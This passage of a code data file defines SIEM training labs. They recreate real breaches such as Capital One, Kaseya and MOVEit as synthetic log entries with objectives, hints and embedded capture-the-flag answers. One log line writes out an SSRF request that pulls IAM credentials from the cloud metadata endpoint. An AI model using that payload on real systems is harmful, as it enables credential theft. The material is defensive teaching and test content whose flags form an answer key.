      { timestamp: '2016-11-08 04:43', eventType: 'CloudAuditLogs', line: 'access_key=AKIAEXAMPLELEAKEDKEY action=GetObject bucket=s3://uber-rider-data object=riders_export_full.csv' },
      { timestamp: '2016-11-08 04:44', eventType: 'CloudAuditLogs', line: 'access_key=AKIAEXAMPLELEAKEDKEY action=GetObject bucket=s3://uber-rider-data object=drivers_export_full.csv' },
      {
        timestamp: '2016-11-08 04:45',
        eventType: 'ANALYST_NOTE',
        line:
          'The key originated from a private GitHub repository accessed using previously-compromised employee ' +
          'credentials, and was used to pull the full rider and driver export files out of s3://uber-rider-data — ' +
          'impacting 57 million riders and drivers in the real incident. flag{uber_2016_s3_rider_driver_data_scope_confirmed}',
      },
    ],
  },
  {
    id: 'siem-qradar-capital-one-ssrf-metadata-2019',
    title: 'IBM QRadar: Capital One 2019 — WAF SSRF to Cloud Metadata Theft',
    difficulty: 'Hard',
    tool: 'qradar',
    datasetLabel: 'Offense #5102 — WAF + cloud API events, 2019',
    briefing:
      'This recreates the real 2019 Capital One breach: a former AWS employee exploited a misconfigured web ' +
      'application firewall — an SSRF vulnerability — to query the EC2 instance metadata service, retrieve ' +
      'temporary IAM credentials the WAF\'s own role held, and use those credentials to access and download over ' +
      '100 million customer records from S3. The activity was ultimately traced back in part to requests ' +
      'originating from a Tor exit node.',
    objectives: [
      { text: 'Search WAF logs for a request to the instance metadata endpoint', why: 'The metadata service at 169.254.169.254 should never be reachable through a public-facing WAF — any request that reaches it via user input is a confirmed SSRF.' },
      { text: 'Confirm the temporary credentials were used against S3 and capture the first flag', why: 'The metadata request alone is the vulnerability; using the resulting credentials against S3 is the actual data-theft action that followed.' },
      { text: 'Identify the anomalous source of the subsequent S3 activity and capture the second flag', why: 'Requests routed through a Tor exit node are a strong anonymization signal that helped investigators separate this activity from routine internal AWS usage during the investigation.' },
    ],
    hints: ['169.254.169.254', 's3:GetObject', 'Tor exit node'],
    totalFlags: 2,
    entries: [
      { timestamp: '2019-03-22 12:01', severity: 'Critical', line: 'category=waf_request source=185.220.101.7 msg="GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/waf-role — SSRF pattern, WAF forwarded the request instead of blocking it"' },
      {
        timestamp: '2019-03-22 12:01',
        severity: 'Critical',
        line:
          'category=waf_request msg="ANALYST NOTE: this request reached the EC2 instance metadata service at ' +
          '169.254.169.254 through the public-facing WAF, which should never be reachable this way — confirmed SSRF ' +
          'vulnerability in the WAF\'s URL-proxying feature. flag{capital_one_waf_ssrf_metadata_confirmed}"',
      },
      { timestamp: '2019-03-22 12:03', severity: 'Critical', line: 'category=cloud_api source=185.220.101.7 action=s3:ListBuckets role=waf-role' },
      { timestamp: '2019-03-22 12:04', severity: 'Critical', line: 'category=cloud_api source=185.220.101.7 action=s3:GetObject bucket=capitalone-customer-archive role=waf-role object=applications_2005_2019.tar' },
      {
        timestamp: '2019-03-22 12:10',
        severity: 'Critical',
        line:
          'category=network_attribution msg="Source IP 185.220.101.7 resolved to a known Tor exit node — the ' +
          'temporary IAM credentials stolen via the metadata SSRF were used from an anonymized connection to pull ' +
          'over 100 million customer records, matching the real 2019 breach scope. ' +
          'flag{capital_one_tor_exit_node_s3_exfiltration_confirmed}"',
      },
    ],
  },
  {
    id: 'siem-qradar-jpmorgan-2014-missed-server',
    title: 'IBM QRadar: JPMorgan Chase 2014 — One Server Missing MFA',
    difficulty: 'Medium',
    tool: 'qradar',
    datasetLabel: 'Offense #2841 — asset audit + auth events, 2014',
    briefing:
      'This recreates the real 2014 JPMorgan Chase breach — at the time one of the largest breaches ever recorded ' +
      'against a US bank, exposing data on 76 million households and 7 million small businesses. The root cause ' +
      'traced back to something almost anticlimactic: a single server that had been overlooked during a ' +
      'two-factor-authentication rollout across the network, giving attackers a foothold with only a stolen ' +
      'password and no second factor required at all.',
    objectives: [
      { text: 'Review the asset inventory audit for MFA enforcement coverage', why: 'This breach\'s root cause is a gap in asset inventory completeness, not a sophisticated exploit — the audit log is where that gap becomes visible.' },
      { text: 'Identify the one server missing MFA enforcement and capture the first flag', why: 'Confirming exactly which single asset was the gap is what turns "somewhere in our network" into an actionable, specific finding.' },
      { text: 'Trace the subsequent lateral movement from that server and capture the second flag', why: 'A single missed server rarely stays contained — tracing exactly how far the resulting foothold spread is what scopes the true blast radius of the incident.' },
    ],
    hints: ['mfa_enforced=false', 'no MFA challenge', 'lateral'],
    totalFlags: 2,
    entries: [
      { timestamp: '2014-06-01', severity: 'Medium', line: 'category=asset_audit host=CORP-SRV-114 mfa_enforced=false msg="Server excluded from the Q2 2FA rollout — reason field blank, appears to be an inventory tracking gap"' },
      { timestamp: '2014-06-01', severity: 'Low', line: 'category=asset_audit host=CORP-SRV-115 mfa_enforced=true msg="2FA enrolled and enforced"' },
      {
        timestamp: '2014-08-07 21:40',
        severity: 'Critical',
        line:
          'category=auth source=203.0.113.90 host=CORP-SRV-114 (mfa_enforced=false) result=success msg="login with ' +
          'valid stolen password, no MFA challenge presented — this is the one server the Q2 rollout missed. ' +
          'flag{jpmorgan_2014_single_missed_server_no_mfa_confirmed}"',
      },
      { timestamp: '2014-08-07 22:10', severity: 'High', line: 'category=lateral_movement source=CORP-SRV-114 dest=CORP-DB-07 msg="Authenticated connection using credentials harvested from CORP-SRV-114"' },
      { timestamp: '2014-08-08 01:15', severity: 'Critical', line: 'category=data_access source=CORP-DB-07 msg="Bulk query against customer household records table"' },
      {
        timestamp: '2014-08-08 01:20',
        severity: 'Critical',
        line:
          'category=analyst_summary msg="Foothold on the one server missing MFA enforcement led directly to lateral ' +
          'movement into a customer database within hours, ultimately exposing data on 76 million households — one ' +
          'incomplete asset inventory entry, not a sophisticated exploit, was the root cause. ' +
          'flag{jpmorgan_2014_lateral_movement_to_customer_db_confirmed}"',
      },
    ],
  },

  // ───────────────────────── SIEM Essentials (mechanics, not incidents) ─────────────────────────
  {
    id: 'siem-splunk-log-normalization-essentials',
    title: 'SIEM Essentials: Log Normalization Across Formats',
    difficulty: 'Easy',
    tool: 'splunk',
    datasetLabel: 'index=raw_ingest — mixed device formats',
    briefing:
      'Different devices speak completely different log languages — a firewall and a Windows server describe ' +
      '"this connection was blocked" and "this login failed" in totally unrelated formats. A SIEM\'s single most ' +
      'foundational job is normalization: converting every source into one common, searchable schema so a single ' +
      'query can correlate across all of them at once. This lab has you find the normalized event that ties two ' +
      'raw, differently-formatted logs together.',
    objectives: [
      { text: 'Search for the raw firewall log entry', why: 'Seeing a device\'s native, unprocessed log format first is what makes normalization\'s value obvious by contrast.' },
      { text: 'Search for the raw Windows log entry', why: 'A completely different vendor format, describing a related event from the same source IP, is exactly the kind of pairing normalization exists to unify.' },
      { text: 'Find the normalized event and capture the flag', why: 'This is the entire point of a SIEM\'s ingestion pipeline: two unrelated-looking raw formats become one searchable, joinable record on a shared field like src_ip.' },
    ],
    hints: ['RAW FIREWALL LOG', 'RAW WINDOWS LOG', 'NORMALIZED EVENT'],
    totalFlags: 1,
    entries: [
      { timestamp: '09:14:01', line: 'RAW FIREWALL LOG (native vendor format): deny tcp src=203.0.113.5 dst=10.10.5.20 dport=22 action=DENY' },
      { timestamp: '09:14:03', line: 'RAW WINDOWS LOG (native EventLog XML format): EventID=4625 Account Name: jsmith Workstation Name: WKSTN-02 Failed Logon Source Network Address: 203.0.113.5' },
      {
        timestamp: '09:14:04',
        line:
          'NORMALIZED EVENT (common schema): src_ip=203.0.113.5 dest_ip=10.10.5.20 action=denied, src_ip=203.0.113.5 ' +
          'user=jsmith event=failed_logon — both raw logs above, despite completely different native formats, now ' +
          'share the identical src_ip field and can be correlated in a single query. This is exactly what SIEM ' +
          'normalization solves. flag{siem_normalization_unifies_firewall_and_windows_schemas}',
      },
    ],
  },
  {
    id: 'siem-sentinel-correlation-rule-tuning',
    title: 'SIEM Essentials: Tuning a Brute-Force Correlation Rule',
    difficulty: 'Medium',
    tool: 'sentinel',
    datasetLabel: 'CorrelationRuleEngine — 2 candidate triggers',
    briefing:
      'A correlation rule as simple as "25 failed logins in 2 minutes" sounds foolproof, until it fires on a ' +
      'misconfigured internal service retrying a stale password every couple of seconds. Tuning a rule is just as ' +
      'much about correctly EXCLUDING known, ticketed, legitimate noise as it is about catching real attacks — get ' +
      'the exclusions wrong and analysts either drown in false positives or, worse, add an exclusion broad enough ' +
      'to hide a real attack.',
    objectives: [
      { text: 'Review the internal service account burst', why: 'A high-volume failure burst from an internal, already-ticketed source is the classic false-positive shape a correlation rule needs to be tuned around.' },
      { text: 'Review the external burst against multiple accounts', why: 'Multiple different accounts targeted from one external, reputation-flagged source in a short window is what an untuned rule and a properly-tuned one should both still catch.' },
      { text: 'Capture the flag on the tuning summary distinguishing the two', why: 'This is the actual skill of detection engineering: not writing the rule, but correctly separating real signal from noise that merely resembles it.' },
    ],
    hints: ['svc_scheduler', 'Tor-associated', 'TRUE POSITIVE'],
    totalFlags: 1,
    entries: [
      {
        timestamp: '14:02',
        eventType: 'CandidateTrigger',
        line:
          'user=svc_scheduler src_ip=10.10.1.9 (internal) 42 failed logins in 90 seconds — investigated previously: ' +
          'a known misconfigured scheduled job retrying an expired password every 2 seconds, ticket INC-4471 already ' +
          'open, correctly EXCLUDED from this correlation rule via a documented tuning exception.',
      },
      {
        timestamp: '14:05',
        eventType: 'CandidateTrigger',
        line: 'users=jsmith,agarcia,mwong src_ip=185.220.101.9 (external, Tor-associated range) 31 failed logins across 3 different accounts in 100 seconds',
      },
      {
        timestamp: '14:06',
        eventType: 'TuningSummary',
        line:
          'TUNING SUMMARY: the svc_scheduler burst above is a known, ticketed, internal false positive correctly ' +
          'excluded by an allow-list exception; the external burst from a Tor-associated range against 3 different ' +
          'accounts is the TRUE POSITIVE this rule exists to catch. flag{sentinel_correlation_rule_tuned_true_positive_vs_known_noise}',
      },
    ],
  },
  {
    id: 'siem-chronicle-threat-intel-ioc-match',
    title: 'SIEM Essentials: Threat Intelligence IOC Matching',
    difficulty: 'Medium',
    tool: 'chronicle',
    datasetLabel: 'NETWORK_CONNECTION events + threat intel feed',
    briefing:
      'On its own, an outbound connection to some external IP is completely unremarkable — SIEMs handle millions ' +
      'of these a day. What turns an ordinary connection into a finding is correlating it against an ingested ' +
      'threat intelligence feed of known-malicious IPs, domains, and file hashes. This lab has you find the one ' +
      'connection in an otherwise clean queue that matches a live IOC feed entry.',
    objectives: [
      { text: 'Search NETWORK_CONNECTION events for the last hour', why: 'Confirms the full set of outbound connections before narrowing to the one that matters.' },
      { text: 'Cross-reference each destination against the ingested threat intelligence feed', why: 'This is the entire value of threat intel integration: a destination with zero other suspicious characteristics still gets flagged because someone else already confirmed it was malicious.' },
      { text: 'Capture the flag on the confirmed IOC match', why: 'A matched IOC feed hit is a real, ready-to-act-on finding with far higher confidence than most behavioral heuristics alone.' },
    ],
    hints: ['metadata.event_type = "NETWORK_CONNECTION"', 'threat intelligence feed', 'CommunityThreatFeed'],
    totalFlags: 1,
    entries: [
      { timestamp: '20:01', eventType: 'NETWORK_CONNECTION', line: 'src=WKSTN-055 dest=13.107.42.14:443 msg="Outbound HTTPS to a known Microsoft CDN range — no IOC match"' },
      { timestamp: '20:04', eventType: 'NETWORK_CONNECTION', line: 'src=WKSTN-071 dest=151.101.1.69:443 msg="Outbound HTTPS to a known Fastly CDN range — no IOC match"' },
      { timestamp: '20:09', eventType: 'NETWORK_CONNECTION', line: 'src=WKSTN-088 dest=185.220.101.204:443 msg="Outbound HTTPS to an uncategorized host — checking against threat intelligence feed"' },
      {
        timestamp: '20:09',
        eventType: 'THREAT_INTEL_MATCH',
        line:
          'destination IP 185.220.101.204 MATCHES an entry in the ingested threat intelligence feed (source: ' +
          'CommunityThreatFeed, tag: "Cobalt Strike C2", confidence: high, first_seen: 3 days ago) — this connection ' +
          'has no other suspicious characteristic on its own and would have gone completely unnoticed without the ' +
          'threat intelligence feed correlation. flag{chronicle_threat_intel_feed_match_confirmed_c2}',
      },
    ],
  },
  {
    id: 'siem-qradar-soar-automated-response',
    title: 'SIEM Essentials: SOAR Automated Response Playbook',
    difficulty: 'Medium',
    tool: 'qradar',
    datasetLabel: 'SOAR playbook execution log',
    briefing:
      'Detecting a threat and actually doing something about it are two different problems. SOAR (Security ' +
      'Orchestration, Automation and Response) closes that gap by automatically executing a pre-approved playbook ' +
      'the instant a high-confidence alert fires — no analyst has to be awake, available, or fast enough to react ' +
      'in real time.',
    objectives: [
      { text: 'Review the triggering detection event', why: 'A SOAR playbook only ever runs off a specific, named trigger — confirming what fired it is the starting point of any playbook review.' },
      { text: 'Review every automated action the playbook executed', why: 'A well-designed playbook chains multiple actions (disable, block, reset, ticket) so no single missed step leaves a gap a human would have had to remember manually.' },
      { text: 'Capture the flag comparing automated response time to manual response time', why: 'The real value of SOAR is measured in this exact comparison — seconds of automated response versus the real-world average delay of a human analyst reacting manually.' },
    ],
    hints: ['SOAR PLAYBOOK', 'disabled user account', '8 seconds'],
    totalFlags: 1,
    entries: [
      { timestamp: '03:14:02', severity: 'Critical', line: 'trigger=impossible_travel_alert user=jsmith source=SOAR_ENGINE msg="High-confidence alert received, executing playbook PB-0042"' },
      {
        timestamp: '03:14:10',
        severity: 'Critical',
        line:
          'SOAR PLAYBOOK EXECUTED (PB-0042): actions_taken = [1) disabled user account jsmith, 2) blocked source IP ' +
          'at the perimeter firewall, 3) forced a password reset, 4) created incident ticket INC-5502] — all four ' +
          'actions completed automatically in under 8 seconds, versus an estimated 22-minute average manual response ' +
          'time for the same four actions performed by a human analyst. flag{qradar_soar_playbook_automated_response_confirmed}',
      },
    ],
  },
  {
    id: 'siem-elastic-pci-dss-compliance-report',
    title: 'SIEM Essentials: Compliance Reporting for a PCI-DSS Audit',
    difficulty: 'Easy',
    tool: 'elastic',
    datasetLabel: 'compliance-report-* — quarterly audit',
    briefing:
      'Detection and response are only half of what a SIEM is actually used for day to day — compliance ' +
      'frameworks like PCI-DSS, HIPAA, and SOC 2 explicitly require organizations to review and retain ' +
      'authentication logs for the systems handling regulated data. Generating that report on demand, with a ' +
      'clean audit trail, is a routine but essential SIEM function.',
    objectives: [
      { text: 'Search for the quarterly compliance report event', why: 'Compliance reporting is itself a loggable, auditable SIEM action — confirming the report was actually generated (and by whom) matters as much as its contents.' },
      { text: 'Confirm the specific requirement this report satisfies', why: 'PCI-DSS Requirement 10.6 (daily log review) is a concrete, citable control — being able to name the exact requirement a report satisfies is what makes it useful to an auditor.' },
      { text: 'Capture the flag on the report summary', why: 'A generated, retained report with a clear record of what was reviewed and what (if anything) needed follow-up is the tangible deliverable a PCI-DSS assessor actually asks to see.' },
    ],
    hints: ['event.category: "compliance_report"', 'PCI-DSS', 'Requirement 10.6'],
    totalFlags: 1,
    entries: [
      { timestamp: 'Q2 2026', eventType: 'compliance_report', line: 'report_type=quarterly_access_review scope=card_data_environment generated_by=soc_analyst_002' },
      {
        timestamp: 'Q2 2026',
        eventType: 'compliance_report',
        line:
          'PCI-DSS COMPLIANCE REPORT (Requirement 10.6 — daily log review, aggregated quarterly): 14,220 ' +
          'authentication events reviewed for the card-data environment this quarter; 3 privileged access events ' +
          'flagged for manual review, all confirmed legitimate against open change-management tickets; report ' +
          'generated and retained for the required 12-month audit trail. flag{elastic_pci_dss_compliance_report_generated}',
      },
    ],
  },

  // ───────────────────────── 5 more real-incident labs ─────────────────────────
  {
    id: 'siem-suricata-rsa-securid-2011',
    title: 'Suricata: The 2011 RSA SecurID Breach',
    difficulty: 'Hard',
    tool: 'suricata',
    datasetLabel: 'eve.json — 8 alerts, March 2011',
    briefing:
      'This recreates the real March 2011 breach of RSA (maker of the SecurID two-factor authentication tokens ' +
      'used by thousands of corporations and government agencies). A small group of employees received a ' +
      'spear-phishing email titled "2011 Recruitment Plan" with an Excel attachment containing an embedded Flash ' +
      'object exploiting a then-unknown zero-day. The resulting foothold let attackers steal information related ' +
      'to SecurID\'s token seed values — later used in an attempted follow-on breach against RSA customer ' +
      'Lockheed Martin.',
    objectives: [
      { text: 'Search the email gateway alert for the phishing attachment', why: 'The exact, oddly specific subject line and file type of a spear-phishing lure is often the clearest artifact tying a targeted intrusion back to its entry point.' },
      { text: 'Confirm the embedded exploit and capture the first flag', why: 'A zero-day embedded inside a routine-looking office document is precisely why "just don\'t open attachments from strangers" was never a sufficient defense against this class of attack.' },
      { text: 'Identify the downstream customer impact and capture the second flag', why: 'This incident\'s real significance was not the initial breach alone — it was that stolen token-seed data was later used in an attempted attack against a DIFFERENT organization entirely, showing how a breach at one vendor can cascade to its customers.' },
    ],
    hints: ['2011 Recruitment Plan', 'Flash', 'Lockheed Martin'],
    totalFlags: 2,
    entries: [
      { timestamp: '2011-03-17 08:14', severity: 'Low', line: 'category=email_gateway msg="Email received, subject: \'2011 Recruitment Plan\', attachment: 2011_Recruitment_plan.xls, sent to 4 employees"' },
      {
        timestamp: '2011-03-17 08:16',
        severity: 'Critical',
        line:
          'category=exploit source=WKSTN-remote-04 msg="Excel process spawned an embedded Flash object exploiting an ' +
          'unknown (zero-day) vulnerability — no signature existed for this at the time of the real attack. ' +
          'flag{rsa_2011_flash_zero_day_excel_phishing_confirmed}"',
      },
      { timestamp: '2011-03-17 08:20', severity: 'High', line: 'category=c2 source=WKSTN-remote-04 dest=external msg="Outbound beacon established following successful exploitation"' },
      { timestamp: '2011-03-20 00:00', severity: 'Critical', line: 'category=data_theft msg="Data related to SecurID token seed values accessed and exfiltrated over the following days"' },
      {
        timestamp: '2011-05-21 00:00',
        severity: 'Critical',
        line:
          'category=downstream_impact msg="An attempted intrusion against Lockheed Martin, an RSA SecurID customer, ' +
          'was detected and repelled — investigators assessed it was enabled by the token-seed data stolen from RSA ' +
          'two months earlier, demonstrating how a breach at one vendor cascades into an attempted breach at its ' +
          'customers. flag{rsa_2011_lockheed_martin_downstream_impact_confirmed}"',
      },
    ],
  },
  {
    id: 'siem-tcpdump-kaseya-vsa-2021',
    title: 'tcpdump: The 2021 Kaseya VSA Supply-Chain Ransomware',
    difficulty: 'Hard',
    tool: 'tcpdump',
    datasetLabel: 'capture.pcap — 10 packets, July 2 2021',
    briefing:
      'This recreates the real July 2021 Kaseya VSA incident. The REvil ransomware group exploited a zero-day in ' +
      'Kaseya VSA — remote-monitoring software used by managed service providers (MSPs) to administer their ' +
      'clients\' networks — to push ransomware through MSPs down to roughly 1,500 downstream small businesses in ' +
      'a single supply-chain attack. The timing was deliberate: the attack launched right before the July 4th ' +
      'holiday weekend in the US, specifically to slow incident response.',
    objectives: [
      { text: 'Capture traffic from the Kaseya VSA server to managed endpoints', why: 'VSA agent check-ins are constant, routine, and fully trusted traffic — exactly why abusing that channel was so effective.' },
      { text: 'Identify the malicious payload disguised as a legitimate agent update and capture the first flag', why: 'Delivering ransomware through the exact same channel and file naming convention as routine software updates is what let it bypass any suspicion at the MSP or client level.' },
      { text: 'Confirm the attack timing relative to the holiday weekend and capture the second flag', why: 'Launching during a long holiday weekend, when security teams are minimally staffed, is a deliberate, repeatedly-used tactic worth recognizing on its own as an attacker decision, not an accident.' },
    ],
    hints: ['agent.exe', 'Kaseya VSA', 'July 4th'],
    totalFlags: 2,
    entries: [
      { timestamp: '2021-07-02 14:02:01', line: 'IP kaseya-vsa-server.example.443 > client-endpoint-04.51102: TLS Application Data (routine VSA agent check-in)' },
      { timestamp: '2021-07-02 14:03:15', line: 'IP kaseya-vsa-server.example.443 > client-endpoint-04.51102: TLS push: agent.exe (disguised as routine Kaseya VSA agent update)' },
      {
        timestamp: '2021-07-02 14:03:20',
        line:
          'ANALYST NOTE: agent.exe pushed through the Kaseya VSA management channel was not a legitimate update — it ' +
          'was the REvil ransomware payload, distributed through the exact trusted channel every downstream MSP ' +
          'client already whitelisted. flag{kaseya_vsa_2021_agent_exe_supply_chain_ransomware_confirmed}',
      },
      { timestamp: '2021-07-02 14:05:00', line: 'IP client-endpoint-04 > client-endpoint-19: SMB — ransomware spreading to additional endpoints within the same MSP client network' },
      { timestamp: '2021-07-03 09:00:00', line: 'IP client-endpoint-04.443 > kaseya-vsa-server.example: ransom note delivered to approximately 1,500 downstream businesses across dozens of MSPs' },
      {
        timestamp: '2021-07-03 09:05:00',
        line:
          'ANALYST NOTE: the attack was launched on July 2nd, immediately before the July 4th US holiday weekend — a ' +
          'deliberate timing choice matching a repeated pattern of ransomware groups launching during periods of ' +
          'minimal security staffing to slow detection and response. flag{kaseya_vsa_2021_july_4th_holiday_timing_confirmed}',
      },
    ],
  },
  {
    id: 'siem-splunk-opm-2015-nation-state',
    title: 'Splunk: The 2015 OPM Breach — Nation-State Long-Dwell Espionage',
    difficulty: 'Hard',
    tool: 'splunk',
    datasetLabel: 'index=opm_investigation — 2014-2015',
    briefing:
      'This recreates the real 2015 breach of the US Office of Personnel Management (OPM), disclosed after ' +
      'attackers — attributed by US officials to China-linked actors — had already been present for roughly a ' +
      'year, ultimately accessing approximately 21.5 million records including highly sensitive SF-86 security ' +
      'clearance background-investigation forms. The breach was finally discovered almost by accident, during a ' +
      'product demonstration of a NEW security tool OPM was evaluating for possible purchase — not through any ' +
      'existing detection capability.',
    objectives: [
      { text: 'Search for the bulk query against background-investigation records', why: 'A query pulling records at a scale and scope no normal HR process would ever need is the actual data-theft event, buried among a year of otherwise unremarkable administrative access.' },
      { text: 'Capture the first flag on the confirmed bulk-access event', why: 'Confirming exactly what was accessed (SF-86 background investigation data, some of the most sensitive personnel data the US government holds) is what scoped the true severity of this breach.' },
      { text: 'Find how the breach was actually discovered and capture the second flag', why: 'This incident is a sobering case study in detection-capability gaps — the compromise was found essentially by chance, not because any existing tool or process was watching for it.' },
    ],
    hints: ['SF-86', 'background investigation', 'product demonstration'],
    totalFlags: 2,
    entries: [
      { timestamp: '2014-05-01', line: 'index=opm_investigation user=admin_svc query="SELECT employee_id, department FROM directory LIMIT 50" (routine, normal admin activity)' },
      {
        timestamp: '2014-05-14',
        line:
          'index=opm_investigation user=admin_svc query="SELECT * FROM sf86_background_investigations" (no LIMIT, no ' +
          'WHERE clause — a bulk export of the entire SF-86 background investigation table, data this admin account ' +
          'has no routine business reason to ever pull in full) flag{opm_2015_bulk_sf86_background_investigation_query_confirmed}',
      },
      { timestamp: '2014-06-01', line: 'index=opm_investigation msg="Continued periodic access to the same tables over the following months, consistent with ongoing, undetected presence"' },
      {
        timestamp: '2015-04-15',
        line:
          'index=opm_investigation msg="ANALYST NOTE: the intrusion was ultimately discovered during a product ' +
          'demonstration of a new security monitoring tool OPM was evaluating for possible future purchase — the ' +
          'demo itself surfaced the anomalous activity, meaning no existing detection capability at OPM had caught ' +
          'roughly a year of active nation-state presence beforehand. flag{opm_2015_discovered_during_product_demonstration}',
      },
    ],
  },
  {
    id: 'siem-sentinel-moveit-cl0p-2023',
    title: 'Microsoft Sentinel: The 2023 MOVEit Transfer Mass Exploitation',
    difficulty: 'Hard',
    tool: 'sentinel',
    datasetLabel: 'WebRequestLogs — MOVEit Transfer, May-June 2023',
    briefing:
      'This recreates the real May-June 2023 mass-exploitation campaign against Progress Software\'s MOVEit ' +
      'Transfer product. The Cl0p ransomware group exploited a SQL injection zero-day (CVE-2023-34362) to plant ' +
      'a webshell and exfiltrate data from hundreds of organizations worldwide in a coordinated, automated ' +
      'campaign — notably, in most cases Cl0p never deployed file-encrypting ransomware at all, running the ' +
      'entire operation as pure data-theft extortion instead.',
    objectives: [
      { text: 'Query web request logs for the SQL injection exploitation pattern', why: 'CVE-2023-34362 is triggered via a crafted request to a specific MOVEit endpoint — recognizing that exact request shape is how this campaign was retroactively identified across hundreds of victims.' },
      { text: 'Confirm the webshell drop and capture the first flag', why: 'The SQL injection alone grants data access; the webshell is what gave attackers a durable, repeatable foothold for continued file harvesting.' },
      { text: 'Confirm the absence of file-encryption activity and capture the second flag', why: 'Recognizing "data theft without encryption" as a deliberate extortion model — not an incomplete attack — is essential for correctly scoping impact: the absence of ransomware does not mean the absence of a serious breach.' },
    ],
    hints: ['human2.aspx', 'webshell', 'no encryption'],
    totalFlags: 2,
    entries: [
      { timestamp: '2023-05-28 22:14', line: 'source=203.0.113.201 msg="POST /guestaccess/human2.aspx — malformed request matching the CVE-2023-34362 SQL injection signature"' },
      {
        timestamp: '2023-05-28 22:15',
        line:
          'msg="ANALYST NOTE: this exact request to human2.aspx is the confirmed exploitation signature for ' +
          'CVE-2023-34362, the MOVEit Transfer SQL injection zero-day mass-exploited by the Cl0p group across ' +
          'hundreds of organizations in this campaign. flag{moveit_2023_cve_2023_34362_sqli_exploitation_confirmed}"',
      },
      { timestamp: '2023-05-28 22:16', line: 'msg="File written to web root: human2.aspx (webshell) — provides persistent, re-usable access for continued file harvesting"' },
      { timestamp: '2023-05-29 01:00', line: 'msg="Bulk file download activity via the webshell — hundreds of files retrieved over several hours"' },
      {
        timestamp: '2023-06-02 00:00',
        line:
          'msg="ANALYST SUMMARY: no encryption or ransom-note deployment activity was ever observed on this ' +
          'host, consistent with Cl0p\'s approach in the real 2023 campaign — running pure data-theft extortion ' +
          'without ever encrypting a single file, proving a breach can be maximally damaging with no ransomware ' +
          'stage at all. flag{moveit_2023_data_theft_no_encryption_extortion_confirmed}"',
      },
    ],
  },
  {
    id: 'siem-chronicle-home-depot-2014',
    title: 'Chronicle: The 2014 Home Depot Breach — Vendor Credentials to POS Malware',
    difficulty: 'Medium',
    tool: 'chronicle',
    datasetLabel: 'VENDOR_ACCESS + POS_ALERT events — 2014',
    briefing:
      'This recreates the real September 2014 Home Depot breach, in which attackers stole roughly 56 million ' +
      'payment card numbers. The entry vector — stolen credentials from a third-party vendor, followed by ' +
      'custom point-of-sale memory-scraping malware — closely mirrors the Target breach from less than a year ' +
      'earlier, illustrating that a well-documented attack pattern does not stop being effective just because it ' +
      'has already been used successfully once.',
    objectives: [
      { text: 'Search vendor access events for the compromised login', why: 'A third-party vendor account is frequently less tightly monitored than an internal employee account, making it an attractive initial-access target.' },
      { text: 'Confirm the vendor credential compromise and capture the first flag', why: 'This is the actual entry point of the breach — not a sophisticated exploit against Home Depot\'s own systems, but a stolen credential belonging to an external party with legitimate network access.' },
      { text: 'Find the POS malware alert and capture the second flag', why: 'Recognizing this exact playbook — vendor credential theft, then custom memory-scraping malware — as functionally identical to the Target 2013 breach is the point: the same technique kept working against a different retailer.' },
    ],
    hints: ['vendor', 'memory-scraping', 'Target'],
    totalFlags: 2,
    entries: [
      { timestamp: '2014-04-10 03:22', eventType: 'VENDOR_ACCESS', line: 'vendor=third_party_refrigeration_contractor login_ip=203.0.113.88 (unfamiliar location for this vendor account) result=success' },
      {
        timestamp: '2014-04-10 03:25',
        eventType: 'ANALYST_NOTE',
        line:
          'This vendor account\'s credentials were used from a location and pattern inconsistent with its normal, ' +
          'infrequent legitimate use — the confirmed initial entry point into Home Depot\'s network. ' +
          'flag{home_depot_2014_vendor_credential_compromise_confirmed}',
      },
      { timestamp: '2014-04-15 00:00', eventType: 'LATERAL_MOVEMENT', line: 'msg="Access pivoted from vendor-facing systems into the point-of-sale network segment over the following days"' },
      { timestamp: '2014-04-30 00:00', eventType: 'POS_ALERT', line: 'msg="Custom memory-scraping malware detected on point-of-sale terminals, harvesting card track data before encryption"' },
      {
        timestamp: '2014-09-02 00:00',
        eventType: 'ANALYST_NOTE',
        line:
          'The vendor-credential-then-POS-malware playbook here is functionally identical to the Target breach less ' +
          'than a year earlier — the same attack pattern succeeded again against a different retailer, ultimately ' +
          'exposing roughly 56 million card numbers. flag{home_depot_2014_same_playbook_as_target_confirmed}',
      },
    ],
  },
];
